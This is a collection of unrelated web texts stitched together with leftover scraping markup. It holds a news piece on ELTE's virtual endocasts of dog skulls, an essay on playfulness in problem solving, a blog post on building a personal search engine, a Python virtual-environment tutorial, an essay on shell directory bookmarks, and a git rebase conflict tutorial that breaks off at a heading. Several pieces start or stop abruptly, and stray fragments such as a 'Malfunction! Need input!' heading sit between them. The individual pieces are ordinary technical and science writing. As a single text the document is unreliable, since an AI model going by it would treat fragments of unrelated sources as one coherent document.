<p>Nowadays, rather than utilising endocasts, invasive process diagnostic imaging techniques are highly preferred. Computer tomography (CT) is the best and easiest way to visualize the bones, with all of their external and internal structures and composition. Using CT is also advantageous in endocranial analysis, as researchers can create virtual endocasts based on the digitized skulls. This allows for a higher freedom during examinations, because these virtual models can be rotated, colorized, cut, and completed. They can be shown not only on mobile phones, tablets or computers, but with the help of 3D-printing technology one can replicate them in the requested number and scale as well.</p>

<p>This digital endocasting technique was used by researchers from ELTE who scanned skulls from the collection of <strong>dr. Tibor Csörgő</strong> (ELTE, Department of Anatomy, Cell and Developmental Biology), which comprises almost 400 dog skulls from 152 canine breeds. “Due to the high resolution scanning, detailed 3D models could be created. This means that not only the main convolutions, that is, the cerebral gyri, can be recognized on the final model, but the location of the major blood vessels can also be seen on the surface.” - explains <strong>dr. Kálmán Czeibert,</strong> veterinarian and postdoctoral researcher at the Senior Family Dog Project, first author of the publication.</p>

<p>“We compared the shape, volume and surface features of the endocasts from 28 specimens in our recent study in <a href="https://www.frontiersin.org/articles/10.3389/fvets.2020.565315/full" target="_blank">Frontiers in Veterinary Science</a>. These models clearly show how the shortening of the facial part of the skull affected the morphology of the brain, distorting the olfactory bulb, which is pushed back and underneath the frontal lobe in certain breeds (like the French bulldog or pug), changing the ratio between the cerebral areas.”</p>

<p>In order to clarify how this change affects dogs’ olfactory and cognitive performance, further imaging and behavioral investigations are needed. The new collection is part of the <strong>Canine Brain and Tissue Bank</strong> at ELTE, funded by a European Research Council (ERC) grant. The bank will help researchers to link the brain with behaviour. “In some areas, where volume has diminished, neuronal density and the relationship with other brain regions may act to counteract these changes. To further examine these speculations, behavioural testing, diagnostic imaging (like CT, MR or EEG), and histological and molecular assessment will be needed.” - said dr. Enikő Kubinyi, senior researcher at ELTE, principal investigator of the research group.</p>

<p>“One of our primary aims was the widespread dissemination of scientific knowledge.’ - adds <strong>dr. Czeibert</strong>. “How dog skulls and brains vary is striking. For example, despite the 30-fold difference in body weight between a Neapolitan mastiff and a chihuahua, their endocasts’ volumes have only a 2-fold difference.” The researchers from ELTE plan to increase the number of skulls by digitizing more specimens for microevolutionary studies in the framework of an international cooperation.</p>

    <p>In my experience solving mathematical problems, I generally make the most progress when I am in a playful mood. 
Relaxed and focused, but focus that is effortless because the problem is so interesting. This brings to mind
a comment by Schmidhuber on laughter and the acquisition of new skills.</p>

<p>During one of his talks, he shares the observation that people generally laugh less frequently as they grow
older. His explanation for this is that humans generally learn less as they age. It is well known that 
neuroplasticity declines as we age, but I also wonder whether this is the whole story. There may be a cultural 
factor and it does appear that some cultures favor the appearance of seriousness more than others. And all 
cultures generally expect adults to look serious most of the time, whether or not this is actually useful.</p>

<p>While the cultural component may be difficult to analyse, I have generally observed that most technical individuals 
tend to become more serious as they are confronted with harder problems. Perhaps this is partly due to the
social expectation that they should look like they know what they are doing. But, this also means that they 
are more likely to revert to type and less likely to experiment. So the problem is more likely to go unsolved
and these individuals are less likely to learn anything new from their efforts.</p>

<p>I won’t pretend that I have an original solution to this problem, but this paradox reminds me of a Zen teaching:</p>

<blockquote>
  <p>In the beginner’s mind there are many possibilities, but in the expert’s there are few.-Shunryu Suzuki</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="root">
	    <div>
<h2>Prelude</h2>
<p>I read more often than ever that people are looking for ways to build
their own search engines.</p>
<p>Even if more on more "advanced" features are integrated into search
engines.  They are mostly based on human grunt work.  Semantic search
engine, whatever "semantic" does mean for you, is in fact merely a
couple, not more than a dozen, set of tricks.  I like to say, much of
Google's search engine is good old human labor.  If you still doubt
it, here is again: Google results are not only biased, also they are
editorialized.  Whether algorithms, and their bugs, party is
irrelevant.</p>
<p>My point is: it is human made.  Not some necessarly advanced alien
tool.</p>
<p>The only thing preventing you to have your own search engine is there
is no readily available software, why? because there is no cheap
hardware.</p>
<p>This might sound like a crazy idea five or ten years ago, but with the
advent of AMD threadripper ie. <a href="http://cultureandempire.com/html/cande.html">cost gravity at
play</a> getting together a
personal search engine is, if not a necessity, at least a possibility.</p>
<p>The most common complain I read about Google is that it yields
irrelevant text "that do no even contain my search terms". That is not
a bug, that is a feature!  It seems to me the subtext is that you can
not easily customize Google or whatever search algorithm since it is
privative.  Even retrieving Google search results for further
processing if not forbidden, is at least difficult.</p>
<h2>Getting started</h2>
<p>Let's start with the beginning: what is a search engine? A search
engine is software that will <strong>crawl</strong> the Internet, <strong>index</strong>
ie. store the text in a particular format, and that users can
<strong>query</strong> and receive in return the most relevant text.</p>
<p>Let's dive into what "relevant text" means. What is relevant text?</p>
<ol>
<li>A text that contains the search term in my query</li>
<li>A text that has the same topic as my query</li>
<li>A text that gives an answer to my query</li>
</ol>
<p>The good answer is "it depends".  That's why queries have grown from
keywords match like a book index, to boolean queries e.g. <code>"Apple"
-bible</code>, until so called semantic search, which boils down to consider
one-way or two-way synonyms and other lexical features.</p>
<p>So far, I failed to build a crawler that works.  Also much of the text
I am looking for is in wikipedia or StackOverflow for which they are
flat releases which are much more easy to get started than putting
together your own crawler.  Still, they are some crawler around, so
you can use that or learn from it.  I will not dive into the crawler
part because it still hurts when I think about <code>robots.txt</code>,
throttling, text encoding etc... booooh!</p>
<p>So, we will imagine that you have a dataset of plain text, for
instance wikipedia vital articles.  It helps if you know the content
of the dataset.  Querying random news article is not very easy to
grasp because you have to read (!) the text to figure when and how
they are relevant.</p>
<p>Before querying, you need to store the text, but to know <strong>how</strong> to
store the text you need to know which query feature you want. To get
started I will only consider positive keywords and negative keywords
like <code>apple -bible</code>. So, we need to figure which find out which text
contains the word <code>apple</code> but not the word <code>bible</code>. Looking up
everything that does not contain <code>bible</code> is difficult, you would need
to <strong>scan</strong> the whole database to what are those document. Instead we
will look for documents that contains the word <code>apple</code>.  So the
following document contains the word we are looking for:</p>
<div><pre><span></span><span>(</span><span>define </span><span>doc1</span> <span>"apple is looking for a search engine."</span><span>)</span>
</pre></div>
<p>That is the moment where the most advanced technology of our current
century makes it appearance: the inverted index.  <strong>What is an inverted
index? It reverses the relationship between the document and the word</strong>.
Instead of saying "this document contains the word apple" it says
"apple is contained in this document".  So we might have a procedure
that returns the document identifier that contains <code>apple</code>, like:</p>
<div><pre><span></span><span>(</span><span>assert</span> <span>(</span><span>contains?</span> <span>(</span><span>inverted-index-lookup</span> <span>"apple"</span><span>)</span> <span>1</span><span>))</span>
</pre></div>
<p><code>inverted-index-lookup</code> returns a list, and that list contains the identifier <code>1</code>
of the first document.  That list might be big. So <strong>you want to consider the least common word from the query</strong>. I call that step
<em>candidates selection</em>.  Also, you might want to convert the positive terms
into lemmas or stems to go toward semantic search, which will mean you need
to store lemmas or stems at index time.</p>
<p>Anyway, the next step, given the list of documents that contain the
least common word or term or lemma or stem, is to <strong>filter and score</strong>
according to the full query. In the above case, that is remove the
documents that contains <code>bible</code>.  You can do that step serially, and
it will necessarly take time.  The trick is to use <code>for-each-par-map</code>.
That is a cousin of map-reduce that execute the map procedure in
parallel.</p>
<p>For instance something like:</p>
<div><pre><span></span><span>(</span><span>let </span><span>((</span><span>hits</span> <span>'</span><span>()))</span>
  <span>(</span><span>for-each-par-map</span>
    <span>(</span><span>lambda </span><span>(</span><span>uid</span> <span>score</span><span>)</span> <span>(</span><span>when</span> <span>score</span> <span>(</span><span>set! </span><span>hits</span> <span>(</span><span>take</span> <span>10</span> <span>(</span><span>sort</span> <span>(</span><span>cons </span><span>(</span><span>cons </span><span>uid</span> <span>score</span><span>)</span> <span>hits</span><span>))))))</span>
    <span>score</span> <span>(</span><span>inverted-index-lookup</span> <span>"apple"</span><span>))</span>
  <span>hits</span><span>)</span>
</pre></div>
<p>The score function is interesting. I think going the
<a href="https://github.com/abusix/ahocorapy">aho-corasick</a> with a
<a href="https://medium.com/analytics-vidhya/converting-boolean-logic-decision-trees-to-finite-state-machines-180ad195abf2">FSM</a>
is the best route because it is easy to implement proximity scoring,
"phrase matching", or really anything I can think of.</p>
<blockquote><p>⚠ That last paragraph is really the most important part of this
post.</p>
</blockquote>
<h2>Conclusion</h2>
<p>There is a gigantic leap that is going to happen in search because of
hardware availability, and free software with readable source ie. the
only thing that makes human progress possible: knowledge sharing.</p>
<h2>Malfunction! Need input!</h2>

<![CDATA[Understanding Virtual Environments]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>What is a python virtual environment ?</span></p>

<p><span>A Python virtual environments is an isolated environment for Python projects. This means that each project can have its own dependencies and let other projects have their own</span></p>

<p><span>It also means each project can have its own python version. For example, Project X could be using Python 2.7 and Project Y uses Python 3.6.</span></p>

<p><span>Creation of python environments is done using the <code>venv</code> module in python. The <code>venv</code> is an inbuilt Python module, no need for any&nbsp;installation if you have python already installed..</span></p>

<p><span>Virtual Environments are created for specific python projects. So to create one, you have to know the path to your project's main directory.</span></p>



<h3><span>Creating a Project directory or folder</span></h3>

<p><span>Run the following code in your command line or terminal:</span></p>

<pre><code>mkdir first_project &amp;&amp; cd first_project</code></pre>

<p><span>The mkdir <code>first_project</code> creates a directory or folder called <code>first_project</code> and the cd f<code>irst_project</code> navigates into the directory. <code>&amp;&amp;</code> just represents "and".</span></p>

<p><span>It is just the same as creating an empty folder and then opening it. Simple<img alt="smiley" src="http://127.0.0.1:8000/static/ckeditor/ckeditor/plugins/smiley/images/regular_smile.png" title="smiley"> </span></p>

<p><span>The directory <code>first_project</code> is the directory where all your project files are going to be. It is also the same directory where our virtual environment will be created</span></p>



<h3><span>Creating the virtual environment</span></h3>

<p><span>To create a virtual environment,&nbsp; run the <code>venv</code> module as a script. Note : You should be navigated into your project directory in the command line before running this:</span></p>

<pre><code>python -m venv firstproject-env</code></pre>

<p><span><code>firstproject-env</code> is the name given to the virtual environment being created, you could call it whatever you want. python tells the virtual environment to be created with Python version available. </span></p>

<p><span>If you have multiple versions of Python on your system, you can select a specific Python version by running <code>python3</code> or whichever version you want like this:</span></p>

<pre><code>python3 -m venv firstproject-env</code></pre>

<p>.<span>The first one is required when you have only one python version installed</span></p>

<p><span>So running the command will create the <code>firstproject-env</code> directory if it doesn’t exist, and also create directories inside it containing a copy of the Python interpreter, the standard library, and various supporting files.</span></p>



<h3><span>Activating virtual environment</span></h3>

<p><span>Once you’ve created a virtual environment, you may activate it.</span></p>

<p><span>On windows : </span></p>

<pre><code>cd firstproject-env/Scripts</code></pre>

<p><span>Then </span></p>

<pre><code>activate.bat</code></pre>



<p><span>On Mac OS</span></p>

<pre><code>source tutorial-env/bin/activate</code></pre>



<p><span>Activating the virtual environment will change your shell’s prompt to show what virtual environment you’re using.</span></p>

<p><span>On windows it looks something like this:</span></p>

<pre><code>(firstproject-env) C:\Users\USER\Desktop\first_project\firstproject-env\Scripts&gt;</code></pre>



<p><span>Thats it. You can then install, upgrade, and remove packages using&nbsp; <strong>pip. </strong>The packages installed will be isolated for only for a given project.</span></p>



<p><span>You should not worry about virtual environments if you are using an IDE like PyCharm. It automatically creates a virtual environment whenever you create a new python project.</span></p>

<p>A small list of methods for fast file system navigation from the command line.
While I tried all of them and finally settled on a minimal approach described at the end, the article doesn’t advocate for one method over the others.
Different users have different needs and should choose the approach most suitable in their circumstances.</p>

<h2 id="spring">Spring</h2>

<p>At the beginning, just after learning to use the command line, my terminal navigation included a lot of <code>cd</code> and a lot of <code>ls</code>.
I jumped around folders, learned shortcuts like, <code>cd ~</code>, <code>cd -</code>, and started becoming familiar with the shell.
Having multi-argument commands for quick file manipulation felt powerful and fresh, or so I remember.</p>

<p>After going to command line you no longer have to open folders in a graphical window manager, scan their names, use <code>&lt;ctrl + mouse click&gt;</code> to select them, and then drag the mouse to move those selected folders to another place.
You do <code>'mv pattern* place/'</code> instead.
All is nice.</p>

<p>But there was one problem.</p>

<h2 id="summer">Summer</h2>

<p>Along the way I started organizing my folders using a structure like this:</p>

<pre><code>└── work
    ├── bitbucket
    │   └── user1
    │       ├── repo1
    │       └── repo2
    ├── github
    │   ├── user1
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user2
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user3
    │   │   ├── repo1
    │   │   ├── repo2
    │   │   ├── repo3
    │   │   └── repo4
    │   └── user4
    │       └── repo1
    ├── teaching
    │   ├── class1
    │   │   ├── lecture1
    │   │   └── lecture2
    │   └── class2
    │       ├── lecture1
    │       └── lecture2
    ├─── clients
    │   ├── client1

    │   │   ├── project2
    │   │   └── project3
    │   ├── client2
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   └── client3
    │      └── project1
    └─── ...
</code></pre>

<p>I often had to go in and out of various project folders and my <code>cd</code> + <code>ls</code> navigation became tedious.
Reaching a project involved navigating a big tree of directories.
On top of that a lot of directories had similar names which got in the way of tab completion.
This is where I found “z” - a command line utility that tracks your most visited folders based on frequency and recency<a href="#fn:1" id="fnref:1" title="see footnote"><sup>○</sup></a>.</p>

<p>“z” keeps a database of your most frequently used folders and allows to quickly jump to these folders even if you don’t remember their full name.
Instead of doing a lot of <code>cd</code> + <code>&lt;tab&gt;</code> all you have to do is type <code>'z proj'</code> and <code>z</code> will take you to your most frequently/recently accessed folder that has <code>proj</code> somewhere in its name.
It takes a short amount of time for “z” to learn about your most visited places but after that it becomes quick and convenient.</p>

<p>But there was one problem.</p>

<h2 id="autumn">Autumn</h2>

<p>“z” didn’t always take me where I wanted to be.
It worked, I would say, around 95% of the time or more.
But those other times it took me to an unrelated directory and distracted from the work at hand forcing to navigate my way back using the old <code>cd</code>.
Moreover, sometimes I moved and renamed various folders which likely contributed to its disorientation.</p>

<p>After this experience I decided that the terminal should be dumb and deterministic without any fuzziness or smart guessing.
And here I found <code>marks</code> - a short and sweet command line script for keeping manual directory bookmarks.<a href="#fn:2" id="fnref:2" title="see footnote"><sup>○</sup></a>
It consisted of 4 tiny functions: one for creating a mark, one for removing, one for listing all the marks, and one for jumping to the bookmarked folder:</p>

<pre><code>export MARKPATH=$HOME/.marks

function mark {
  mkdir -p "$MARKPATH"; ln -s "$(pwd)" "$MARKPATH/$1"
}

function unmark {
  rm -i "$MARKPATH/$1"
}

function marks {
  ls -l "$MARKPATH" | sed 's/  / /g' | cut -d' ' -f9- | sed 's/ -/\t-/g' &amp;&amp; echo
}

function jump {
  cd -P "$MARKPATH/$1" 2&gt;/dev/null || echo "No such mark: $1"
}
</code></pre>

<p>As well as a function generating completion suggestions after pressing <code>&lt;tab&gt;</code>:</p>

<pre><code>_completemarks() {
  local curw=${COMP_WORDS[COMP_CWORD]}
  local wordlist=$(find $MARKPATH -type l -printf "%f\n")
    COMPREPLY=($(compgen -W '${wordlist[@]}' -- "$curw"))
    return 0
}

complete -F _completemarks jump unmark
</code></pre>

<p>The workflow of marks is manual but convenient.
You have to go into the directory you want to bookmark and execute the <code>mark</code> command followed by the custom name, like <code>'mark myproject'</code>.
After that you can quickly jump back to this bookmarked folder using <code>'jump myproject'</code> and when the bookmark is no longer relevant you can get rid of it with <code>'unmark myproject'</code>.</p>

<p>With this approach the user is in control.
There is no secret smart behaviour which means no auto-magic and no surprises.
And after moving a project to another place the bookmark can be easily adjusted to point to its new location immediately, without waiting for a hidden automatic process to update its location, frequency, and recency.</p>

<p>But there was one problem.</p>

<h2 id="winter">Winter</h2>

<p>Neither of those <code>jump</code> nor <code>z</code> commands could take me everywhere I needed to go.
So the typical workflow would start with jumping to a project via the <code>jump</code> command but then switching to the old navigation via <code>cd</code> once inside it.
Which meant that for navigating the file system I always had to keep using both: <code>jump</code> and <code>cd</code>.
And having two distinct commands for doing the same thing felt a bit weird.
This is where I learned about the <code>$CDPATH</code><a href="#fn:3" id="fnref:3" title="see footnote"><sup>○</sup></a> variable and rolled out my own solution.</p>

<p>All you have to do is add this to your .bashrc:</p>

<pre><code>export CDPATH=.:~/.marks/

function mark {
  ln -sr "$(pwd)" ~/.marks/"$1"
}
</code></pre>

<p>Then, to add a bookmark called <code>@name</code> for the current directory:</p>

<pre><code>mark @name
</code></pre>

<p>To jump to its location:</p>

<pre><code>cd @name
</code></pre>

<p>To list all available bookmarks:</p>

<pre><code>cd @&lt;tab&gt;
</code></pre>

<p>And to delete a bookmark when it’s no longer needed:</p>

<pre><code>rm ~/.marks/@name
</code></pre>

<p><code>$CDPATH</code> solution works best when all the bookmarks are started with a special symbol which in my case was <code>@</code>.
This solves a couple of problems.
First, bookmarks, if prefixed with <code>@</code> symbol, will not interfere with directories in the current folder.
Second, all the available bookmarks will be displayed by typing <code>'cd @&lt;tab&gt;'</code>.
And third, all bookmarks are now part of <code>cd</code> and so they gain tab completion for free.
You can even use tab completion for jumping directly to folders nested within bookmarks by doing <code>'cd @bookmark/subfolder/'</code>.</p>

<p>Using this method you no longer have to maintain several custom functions and their autocompletion in .bashrc.
And the action for changing directory is always performed using the same familiar <code>cd</code> command, independent of whether the directory is a bookmark or not.</p>

<p>But there was one problem.</p>

<h2 id="springagain">Spring again</h2>

<p>After working with the <code>$CDPATH</code> approach for a while I began noticing something peculiar.
At no point in time did I have a list with a dozen or more bookmarks.
Instead I found myself constantly going to the same 2 or 3 projects, finishing them, removing them from <code>~/.marks/</code> folder, adding new ones, and repeating the cycle again.
Why would someone keep bookmarks for 3 directories?</p>

<p>This time, instead of changing the command, I tried to do something different and changed the folder structure.
My projects moved from the state of being relevant to being archived so why not create an archive directory and organize folders based not on their name or type but on state?
Thus the <code>"zzz"</code> folder was born.
And now my project structure looks something like this:</p>

<pre><code>└── work
    ├── active_project1
    ├── active_project2
    └── zzz
        ├── bitbucket
        │   └── user1
        │       ├── repo1
        │       └── repo2
        ├── github
        │   ├── user1
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user2
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user3
        │   │   ├── repo1
        │   │   ├── repo2
        │   │   ├── repo3
        │   │   └── repo4
        │   └── user4
        │       └── repo1
        ├── teaching
        │   ├── class1
        │   │   ├── lecture1
        │   │   └── lecture2
        │   └── class2
        │       ├── lecture1
        │       └── lecture2
        ├─── clients
        │   ├── client1
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   ├── client2
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   └── client3
        │      └── project1
        └─── ...
</code></pre>

<p>With this structure the bookmarking systems no longer provide big benefits as most frequent and recent folders are always under ~/work/some_project.
And since at any timepoint only a few of them are visible the tab completion will do its job: <code>'cd ~/w&lt;tab&gt;/s&lt;tab&gt;'</code>.</p>

<p>The name <code>"zzz"</code> might seem strange but is convenient: the letters “zzz” symbolically mark the projects within as being in a “sleeping” state while the 3 “z” letters in a row make sure that this folder is always placed at the very end of your active project list.
A nice folder structure is still maintained in the archive but for the ease of access all active folders are layed flat under the <code>~/work/</code> directory.
When the project is paused or completed it is moved to its place within the <code>"zzz"</code> hierarchy, maintaining the previous structure.
There is one extra benefit - contents of the <code>"work"</code> directory act as a reminder about all the projects that are in progress.
If necessary a to-do list with concrete details might be placed at the same level.</p>

<p>And just like that, like a newbie, I navigate the file system with <code>cd</code> and <code>ls</code> again.</p>

  <h3>git-rebase-conflicts</h3>
  
<h2 id="a-note-about-terminology">A note about terminology</h2>
<p>This article is about <code>git rebase</code> conflicts. A similar article with slightly different technical details could be written for <code>git merge</code> conflicts. I use “merge” as a non-technical term for combining the content of two different repository states, not to refer to <code>git merge</code>ing specifically.</p>
<h2 id="introduction">Introduction</h2>
<p>When a git rebase conflict occurs you will be presented with a conflict region (or “hunk”) that shows why the rebased commit couldn’t be applied to the base branch. To resolve a rebase conflict, your task is to apply the logically-intended (i.e.&nbsp;semantic) change of the rebased commit to the base branch.</p>
<p>Some merge tools (for example <a href="https://emacs.stackexchange.com/questions/16469/how-to-merge-git-conflicts-in-emacs/16470#16470">Emacs SMerge</a>) offer you the option to “keep their changes” or “keep our changes”. This is almost always wrong. The whole point of merging (remember, I’m using that word in the non-technical sense, not to refer to <code>git merge</code>ing specifically) is to <em>combine</em> two conflicting things, not to choose one over the other. By choosing one you ignore a change in the other that may be required by other parts of the same commit (parts that may not see because they merged without conflict!).</p>
<p>The existence of a conflict means that the patches could not be merged textually. However, the aim is actually to merge them <em>semantically</em>. Merge tools are rarely (perhaps never) clever enough to be able to perform semantic merges so they settle for textual merges. In the cases where textual merges are not possible the task is left to human ingenuity.</p>
<p>Key takeaway: the aim is to apply the logical (i.e.&nbsp;semantic) content of the rebased commit to the base branch.</p>
<h2 id="summary-of-the-conflict-resolution-procedure">Summary of the conflict resolution procedure</h2>
<p>Resolving a rebase conflict requires understanding the logically intended (semantic) change of the rebased commit and applying it manually to the base branch. Here is the procedure to follow. The details will be explained by way of example later.</p>
<ol type="1">
<li><p>Issue the <code>git rebase</code> command.</p>
<p>Use the <code>diff3</code> conflict style option because it shows important information in the conflict markers that would otherwise be absent.</p>
<pre><code>git -c merge.conflictStyle=diff3 rebase ...</code></pre></li>
<li><p>For each conflict, observe the logical change that the rebased commit was intended to make.</p>
<ul>
<li><p>Either look at the difference between the middle hunk section and the bottom hunk section of the marked conflict, or</p></li>
<li><p>look at <code>git show REBASE_HEAD</code></p></li>
</ul></li>
<li><p>Observe the state of the base branch at each conflict region.</p>
<ul>
<li><p>Either look at the top hunk section of the marked conflict, or</p></li>
<li><p>look at <code>git show HEAD:&lt;filename&gt;</code></p></li>
</ul></li>
<li><p>Apply, to the base branch, the logical change that the rebased commit was intended to make.</p>
<p>This will probably be easiest to do by editing the top hunk section of the conflict and then deleting the others.</p></li>
<li><p>Add the file and continue the rebase, with <code>git add</code> and</p>
<pre><code>git -c merge.conflictStyle=diff3 rebase --continue</code></pre></li>
</ol>
<h2 id="why-use-diff3">Why use <code>diff3</code>?</h2>
<p>It is literally impossible to resolve conflicts using the default merge conflict style. I suggest setting <code>diff3</code> in your global options.</p>
<pre><code>git config --global merge.conflictStyle diff3</code></pre>
<p>Why is it literally impossible? Consider a branch which adds a function <code>foo1</code> at a particular source file location</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>def</span> foo1():</span>
<span id="cb4-2">    <span>print</span>(<span>"foo1"</span>)</span></code></pre></div>
<p>and another branch which adds a function <code>foo2</code> at the same location</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>def</span> foo2():</span>
<span id="cb5-2">    <span>print</span>(<span>"foo2"</span>)</span></code></pre></div>
<p>If I rebase one on the other I get a conflict. The default merge conflict style will show</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb6-2"> +def foo1():</span>
<span id="cb6-3"> +    print("foo1")</span>
<span id="cb6-4"><span>++=======</span></span>
<span id="cb6-5"><span>+ def foo2():</span></span>
<span id="cb6-6"><span>+     print("foo2")</span></span>
<span id="cb6-7"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add foo2</span></span></code></pre></div>
<p>What are the conflict markers telling me? They’re telling me that I need to <em>add</em> both <code>foo1</code> and <code>foo2</code> to the file, right? Unfortunately not! Consider a file in which <code>foo1</code> and <code>foo2</code> already exist, and two branches, one of which removes <code>foo1</code> and one of which removes <code>foo2</code>. If I rebase one on the other what is the result? The default merge conflict style will show</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb7-2"> +def foo1():</span>
<span id="cb7-3"> +    print("foo1")</span>
<span id="cb7-4"><span>++=======</span></span>
<span id="cb7-5"><span>+ def foo2():</span></span>
<span id="cb7-6"><span>+     print("foo2")</span></span>
<span id="cb7-7"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Remove foo1</span></span></code></pre></div>
<p>Under the default conflict style the case of removing two functions is indistinguishable from the case of adding two functions (besides the text of the commit message which can only ever be a hint)! Therefore the default conflict style is insufficient for purpose of resolving conflicts. This probably explains why resolving conflicts is seen as a dark art. <code>diff3</code> not only makes it possible, below we will see that it is often easy.</p>
<h2 id="example-file">Example file</h2>
<p>The examples will based on changes to this example Python file.</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>def</span> foo1():</span>
<span id="cb8-2">    <span>print</span>(<span>"foo1"</span>)</span>
<span id="cb8-3"></span>
<span id="cb8-4"><span>def</span> foo2():</span>
<span id="cb8-5">    <span>print</span>(<span>"foo2"</span>)</span>
<span id="cb8-6"></span>
<span id="cb8-7"><span>def</span> foo3():</span>
<span id="cb8-8">    <span>print</span>(<span>"foo3"</span>)</span>
<span id="cb8-9"></span>
<span id="cb8-10"><span>def</span> foo4():</span>
<span id="cb8-11">    <span>print</span>(<span>"foo4"</span>)</span>
<span id="cb8-12"></span>
<span id="cb8-13"><span>def</span> foo5():</span>
<span id="cb8-14">    <span>print</span>(<span>"foo5"</span>)</span>
<span id="cb8-15"></span>
<span id="cb8-16"><span>def</span> main():</span>
<span id="cb8-17">    foo1()</span>
<span id="cb8-18">    foo2()</span>
<span id="cb8-19">    foo3()</span></code></pre></div>
<h2 id="worked-example-adding-two-different-things">Worked example: adding two different things</h2>
<p>Suppose I have a patch that adds a call of <code>foo4</code> and another patch that adds a call of <code>foo5</code>, that is</p>
<div id="cb9"><pre><code><span id="cb9-1"> def main():</span>
<span id="cb9-2">     foo1()</span>
<span id="cb9-3">     foo2()</span>
<span id="cb9-4">     foo3()</span>
<span id="cb9-5"><span>+    foo4()</span></span></code></pre></div>
<p>and</p>
<div id="cb10"><pre><code><span id="cb10-1"> def main():</span>
<span id="cb10-2">     foo1()</span>
<span id="cb10-3">     foo2()</span>
<span id="cb10-4">     foo3()</span>
<span id="cb10-5"><span>+    foo5()</span></span></code></pre></div>
<p>If I try to rebase the latter on the former then the result is a conflict. The conflict is marked in the file by conflict markers, as below. This is sometimes referred to as a “hunk”. There are three sections in the hunk:</p>
<ol type="1">
<li><p>Between <code>&lt;&lt;&lt;</code> and <code>|||</code>: the state of the base branch, i.e.&nbsp;what the rebase commit actually saw when it tried to apply its change</p></li>
<li><p>Between <code>|||</code> and <code>===</code>: the state that the rebased commit expected to see</p></li>
<li><p>Between <code>===</code> and <code>&gt;&gt;&gt;</code>: what the result of applying the rebased commit would have been, if it had seen what it expected</p></li>
</ol>
<p>These three sections are always different from each other. If any pair were the same then there would be no conflict!</p>
<div id="cb11"><pre><code><span id="cb11-1">      foo1()</span>
<span id="cb11-2">      foo2()</span>
<span id="cb11-3">      foo3()</span>
<span id="cb11-4"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb11-5"> +    foo4()</span>
<span id="cb11-6"><span>++||||||| merged common ancestors</span></span>
<span id="cb11-7"><span>++=======</span></span>
<span id="cb11-8"><span>+    foo5()</span></span>
<span id="cb11-9"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add foo 5</span></span></code></pre></div>
<h3 id="the-intent-of-the-rebased-commit">The intent of the rebased commit</h3>
<p>There are two equivalent ways to see the logical intent of the rebased commit.</p>
<ul>
<li><p>It is the difference between the middle hunk section (below “merged common ancestors”) and the bottom hunk section (above the commit description, “Add foo 5”).</p></li>
<li><p>It is shown in the output of <code>git show REBASE_HEAD</code>. This is generally easier to interpret than the above, but more verbose as it also contains diffs relating to non-conflicting parts of the commit. In this case it shows</p></li>
</ul>
<div id="cb12"><pre><code><span id="cb12-1">     foo1()</span>
<span id="cb12-2">     foo2()</span>
<span id="cb12-3">     foo3()</span>
<span id="cb12-4"><span>+    foo5()</span></span></code></pre></div>
<p>Using either method you can see that the logical change of the rebased commit is to add <code>foo5()</code> after <code>foo3()</code>.</p>
<h3 id="the-state-of-the-base-branch">The state of the base branch</h3>
<p>There are two equivalent ways to see the state of the base branch.</p>
<ul>
<li><p>The top hunk section (below <code>HEAD</code>)</p></li>
<li><p>The output of <code>git show HEAD:&lt;filename&gt;</code>. This latter form is probably less useful than the former because it shows the entire state of <code>&lt;filename&gt;</code> without drawing your attention to the conflicting section. In this case it shows</p></li>
</ul>
<pre><code>...
def main():
    foo1()
    foo2()
    foo3()
    foo4()</code></pre>
<p>Either way, you can see that the base branch has <code>foo4()</code> after <code>foo3()</code>.</p>
<h3 id="resolving-the-conflict">Resolving the conflict</h3>
<p>The correct way to resolve this conflict is to apply the logical change of the rebased commit—adding <code>foo5()</code> after <code>foo3()</code>—to state of the base branch—which has <code>foo4()</code> after <code>foo3()</code>. In your editor this will typically be easiest to do by making the change to the top hunk section and then deleting the other hunk sections. It requires semantic understanding to know exactly which way of resolving the conflict is satisfactory, if any. For example, we could put <code>foo5()</code> either before or after the appearance of <code>foo4()</code>. Let’s choose the latter and add <code>foo5()</code> below <code>foo4()</code> in the top hunk section (i.e.&nbsp;below <code>HEAD</code>).</p>
<div id="cb14"><pre><code><span id="cb14-1">      foo1()</span>
<span id="cb14-2">      foo2()</span>
<span id="cb14-3">      foo3()</span>
<span id="cb14-4"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb14-5"> +    foo4()</span>
<span id="cb14-6"> +    foo5()</span>
<span id="cb14-7"><span>++||||||| merged common ancestors</span></span>
<span id="cb14-8"><span>++=======</span></span>
<span id="cb14-9"><span>+    foo5()</span></span>
<span id="cb14-10"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add foo 5</span></span></code></pre></div>
<p>and then delete the middle and bottom hunk sections, and the conflict markers, to get</p>
<div id="cb15"><pre><code><span id="cb15-1"><span>def</span> main():</span>
<span id="cb15-2">    foo1()</span>
<span id="cb15-3">    foo2()</span>
<span id="cb15-4">    foo3()</span>
<span id="cb15-5">    foo4()</span>
<span id="cb15-6">    foo5()</span></code></pre></div>
<p>Once this change has been made the file can be <code>git add</code>ed and the rebase can continue via <code>git rebase --continue</code>.</p>
<h2 id="worked-example-removing-two-different-things">Worked example: removing two different things</h2>
